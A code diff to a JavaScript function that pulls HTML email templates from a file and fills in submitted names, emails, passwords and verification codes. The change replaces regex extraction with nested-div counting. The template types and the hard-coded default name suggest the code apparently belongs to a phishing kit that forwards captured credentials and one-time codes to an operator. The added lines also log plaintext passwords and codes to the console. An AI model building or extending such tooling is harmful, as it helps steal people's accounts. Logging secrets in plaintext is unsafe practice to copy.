@@ -10,19 +10,49 @@ function getEmailTemplate(templateType, data) {
   const templatePath = path.join(__dirname, '..', 'email-template.html');
   let template = fs.readFileSync(templatePath, 'utf8');
   
-  // Extract the specific template - extract content inside the div
-  const templateRegex = new RegExp(`<div id="template-${templateType}">([\\s\\S]*?)</div>`);
-  const match = template.match(templateRegex);
-  
-  if (!match) {
-    console.error('Template not found:', templateType);
+  // Extract the specific template - use a more robust regex to handle nested tables
+  const startIndex = template.indexOf(`<div id="template-${templateType}">`);
+  if (startIndex === -1) {
+    console.error('Template start not found:', templateType);
     throw new Error(`Template ${templateType} not found`);
   }
   
-  let specificTemplate = match[1];
+  // Find the matching closing div by counting nested divs
+  let depth = 1;
+  let currentIndex = startIndex + `<div id="template-${templateType}">`.length;
+  let endIndex = -1;
+  
+  while (depth > 0 && currentIndex < template.length) {
+    const nextOpen = template.indexOf('<div', currentIndex);
+    const nextClose = template.indexOf('</div>', currentIndex);
+    
+    if (nextClose === -1) {
+      break;
+    }
+    
+    if (nextOpen !== -1 && nextOpen < nextClose) {
+      depth++;
+      currentIndex = nextOpen + 4;
+    } else {
+      depth--;
+      if (depth === 0) {
+        endIndex = nextClose;
+        break;
+      }
+      currentIndex = nextClose + 6;
+    }
+  }
+  
+  if (endIndex === -1) {
+    console.error('Template end not found:', templateType);
+    throw new Error(`Template ${templateType} closing div not found`);
+  }
+  
+  let specificTemplate = template.substring(startIndex, endIndex + 6);
   
   console.log('Extracted template length:', specificTemplate.length);
   console.log('Template contains placeholders:', specificTemplate.includes('{{'));
+  console.log('Data received:', JSON.stringify(data));
   
   // Replace placeholders based on template type
   const timestamp = new Date().toISOString();
@@ -39,21 +69,24 @@ function getEmailTemplate(templateType, data) {
       specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
       specificTemplate = specificTemplate.replace(/\{\{email\}\}/g, data.email || 'Not provided');
       specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
-      console.log('Email template after replacement:', specificTemplate.includes(data.email || 'Not provided'));
+      console.log('Email value being replaced:', data.email);
+      console.log('Template after email replacement:', specificTemplate.includes(data.email));
       break;
       
     case 'password-submission':
       specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
       specificTemplate = specificTemplate.replace(/\{\{password\}\}/g, data.password || 'Not provided');
       specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
-      console.log('Password template after replacement:', specificTemplate.includes(data.password || 'Not provided'));
+      console.log('Password value being replaced:', data.password);
+      console.log('Template after password replacement:', specificTemplate.includes(data.password));
       break;
       
     case 'verification-code':
       specificTemplate = specificTemplate.replace(/\{\{name\}\}/g, data.name || 'Sugeng Yulianto');
       specificTemplate = specificTemplate.replace(/\{\{code\}\}/g, data.code || 'Not provided');
       specificTemplate = specificTemplate.replace(/\{\{timestamp\}\}/g, timestamp);
-      console.log('Code template after replacement:', specificTemplate.includes(data.code || 'Not provided'));
+      console.log('Code value being replaced:', data.code);
+      console.log('Template after code replacement:', specificTemplate.includes(data.code));
       break;
       
     case 'information-submission':
@@ -68,6 +101,7 @@ function getEmailTemplate(templateType, data) {
   }
   
   console.log('Final template still has placeholders:', specificTemplate.includes('{{'));
+  console.log('Final template length:', specificTemplate.length);
   return specificTemplate;
 }
 
